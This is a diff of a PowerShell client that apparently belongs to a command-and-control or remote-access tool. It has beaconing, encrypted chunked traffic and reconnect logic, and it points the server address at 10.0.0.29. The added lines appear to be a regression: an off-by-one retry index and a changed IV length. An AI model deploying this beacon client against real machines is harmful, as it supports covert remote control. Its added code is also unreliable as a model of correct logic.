@@ -6,10 +6,10 @@ $global:startTime = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
 $global:exitProcess = $false
 $global:SESSION_ID = $null
 $global:LOGGING = $true
-$global:CVER = "0.3.0"
+$global:CVER = "0.2.0"
 $global:TYPE = "ps"
 $global:CHUNK_SIZE = 1024
-$global:SERVER_ADDRESS = 'localhost'
+$global:SERVER_ADDRESS = '10.0.0.29'
 $global:SERVER_PORT = 54678
 $global:MAX_RETRIES = 5
 $global:RETRY_INTERVALS = @(
@@ -93,7 +93,7 @@ function Encrypt-Data {
     try {
         $salt = [byte[]]::new(32)
         [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($salt)
-        $iv = [byte[]]::new(12)
+        $iv = [byte[]]::new(16)
         [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($iv)
         $key = [System.Security.Cryptography.Rfc2898DeriveBytes]::new(
             $sharedKey, 
@@ -152,7 +152,7 @@ function Decrypt-Data {
 function Get-RetryInterval {
     param ($retries)
     if ($retries -lt $global:RETRY_INTERVALS.Length) {
-        return $global:RETRY_INTERVALS[$retries]
+        return $global:RETRY_INTERVALS[$retries-1]
     }
     return 0
 }
@@ -401,9 +401,15 @@ function Connect-ToServer {
             Log-It 'Connection to server closing.'
             if ($global:beaconIntervalInstance) {
                 $global:beaconIntervalInstance.Stop()
+                Unregister-Event $global:beaconIntervalInstance
                 $global:beaconIntervalInstance.Dispose()
             }
+            if ($global:logStream) {
+                $global:logStream.Close()
+                $global:logStream.Dispose()
+            }
             if ($global:exitProcess) {
+                $global:client.Close()
                 $shouldContinue = $false
             }
             else {
@@ -417,9 +423,6 @@ function Connect-ToServer {
                     $retryInterval = Get-RetryInterval -retries $connectionRetries
                     Log-It "Attempting to reconnect in $($retryInterval / 1000) seconds..."
                     Start-Sleep -Milliseconds $retryInterval
-                    if ($global:client) {
-                        $global:client.Close()
-                    }
                 }
             }
         }
